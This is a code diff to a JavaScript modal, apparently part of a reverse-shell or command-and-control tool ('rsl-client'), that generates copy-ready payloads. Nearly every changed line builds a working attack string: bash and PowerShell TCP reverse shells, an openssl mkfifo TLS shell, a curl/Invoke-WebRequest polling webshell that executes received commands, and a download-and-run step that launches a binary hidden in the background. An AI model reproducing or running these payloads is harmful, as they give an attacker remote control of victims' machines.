@@ -1405,21 +1405,36 @@ const PayloadsModal = () =>
       const httpProto = location.protocol === "https:" ? "https" : "http";
       const wsProto = location.protocol === "https:" ? "wss" : "ws";
       const token = app.buildToken || "YOUR_BUILD_TOKEN";
-      const os = app.payloadOs || "linux";
-      const arch = app.payloadArch || "amd64";
-      const isWindows = os === "windows";
-      const tcpPayload = `bash -i >& /dev/tcp/${hostname}/1337 0>&1`;
-      const tlsPayload = `mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | openssl s_client -quiet -connect ${hostname}:1338 >/tmp/f`;
-      const webPayload = `H=${httpProto}://${host}; T=${token}\nID=$(curl -s "$H/webshell/register?token=$T")\nwhile :; do\n  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")\n  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)\n  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"\ndone`;
-      const muxPayload = `RSL_SERVER=${wsProto}://${host}/mux RSL_TOKEN=${token} ./rsl-client`;
-      const muxDownloadPayload = isWindows
-        ? `Invoke-WebRequest -Uri '${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}' -OutFile "$env:TEMP\\rsl.exe"\nStart-Process "$env:TEMP\\rsl.exe" -WindowStyle Hidden`
-        : `curl -sL '${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}' -o /tmp/rsl\nchmod +x /tmp/rsl\n/tmp/rsl &`;
+      const makeTcpPayload = () => {
+        if (app.payloadOs === "windows") {
+          return `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${hostname}',1337); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }"`;
+        }
+        return `bash -i >& /dev/tcp/${hostname}/1337 0>&1`;
+      };
+      const makeTlsPayload = () => {
+        if (app.payloadOs === "windows") {
+          return `# TLS on Windows requires OpenSSL or a .NET client; use the mux client instead`;
+        }
+        return `mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | openssl s_client -quiet -connect ${hostname}:1338 >/tmp/f`;
+      };
+      const makeWebPayload = () => {
+        const H = `${httpProto}://${host}`;
+        if (app.payloadOs === "windows") {
+          return `$H = '${H}'; $T = '${token}'\n$ID = (Invoke-WebRequest -Uri "$H/webshell/register?token=$T" -UseBasicParsing).Content\nwhile ($true) {\n  $C = (Invoke-WebRequest -Uri "$H/webshell/$ID/poll" -Headers @{'X-RSL-Token'=$T} -UseBasicParsing).Content\n  if ($C) { $O = Invoke-Expression $C 2>&1 | Out-String }\n  Invoke-WebRequest -Uri "$H/webshell/$ID/output" -Method POST -Headers @{'X-RSL-Token'=$T} -Body $O -UseBasicParsing | Out-Null\n  Start-Sleep -Seconds 1\n}`;
+        }
+        return `H=${httpProto}://${host}; T=${token}\nID=$(curl -s "$H/webshell/register?token=$T")\nwhile :; do\n  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")\n  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)\n  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"\ndone`;
+      };
+      const makeMuxPayload = () => {
+        if (app.payloadOs === "windows") {
+          return `$env:RSL_SERVER = '${wsProto}://${host}/mux'; $env:RSL_TOKEN = '${token}'; .\\rsl-client.exe`;
+        }
+        return `RSL_SERVER=${wsProto}://${host}/mux RSL_TOKEN=${token} ./rsl-client`;
+      };
       const makeMuxDownloadPayload = () => {
-        const isWindows = app.payloadOs === "windows";
-        return isWindows
-          ? `Invoke-WebRequest -Uri '${httpProto}://${host}/dl?token=${token}&os=${app.payloadOs}&arch=${app.payloadArch}' -OutFile "$env:TEMP\\rsl.exe"\nStart-Process "$env:TEMP\\rsl.exe" -WindowStyle Hidden`
-          : `curl -sL '${httpProto}://${host}/dl?token=${token}&os=${app.payloadOs}&arch=${app.payloadArch}' -o /tmp/rsl\nchmod +x /tmp/rsl\n/tmp/rsl &`;
+        if (app.payloadOs === "windows") {
+          return `Invoke-WebRequest -Uri '${httpProto}://${host}/dl?token=${token}&os=${app.payloadOs}&arch=${app.payloadArch}' -OutFile "$env:TEMP\\rsl.exe"\nStart-Process "$env:TEMP\\rsl.exe" -WindowStyle Hidden`;
+        }
+        return `curl -sL '${httpProto}://${host}/dl?token=${token}&os=${app.payloadOs}&arch=${app.payloadArch}' -o /tmp/rsl\nchmod +x /tmp/rsl\n/tmp/rsl &`;
       };
       const copy = (fn) =>
         navigator.clipboard.writeText(typeof fn === "function" ? fn() : fn).catch(() => {});
@@ -1436,10 +1451,10 @@ const PayloadsModal = () =>
           )
         );
       const allPayloads = () =>
-        `# Raw TCP\n${tcpPayload}\n\n` +
-        `# TLS\n${tlsPayload}\n\n` +
-        `# HTTP webshell\n${webPayload}\n\n` +
-        `# Mux / Go client\n${muxPayload}\n\n` +
+        `# Raw TCP\n${makeTcpPayload()}\n\n` +
+        `# TLS\n${makeTlsPayload()}\n\n` +
+        `# HTTP webshell\n${makeWebPayload()}\n\n` +
+        `# Mux / Go client\n${makeMuxPayload()}\n\n` +
         `# Mux / download & run (${app.payloadOs}/${app.payloadArch})\n${makeMuxDownloadPayload()}`;
       const copyAll = async () => {
         try {
@@ -1491,10 +1506,10 @@ const PayloadsModal = () =>
               () => (app.payloadsCopiedAll ? "Copied all!" : "Copy all")
             )
           ),
-          block("Raw TCP", tcpPayload),
-          block("TLS", tlsPayload),
-          block("HTTP webshell", webPayload),
-          block("Mux / Go client", muxPayload),
+          block("Raw TCP", makeTcpPayload),
+          block("TLS", makeTlsPayload),
+          block("HTTP webshell", makeWebPayload),
+          block("Mux / Go client", makeMuxPayload),
           block(() => `Mux / download & run (${app.payloadOs}/${app.payloadArch})`, makeMuxDownloadPayload),
         ],
       });
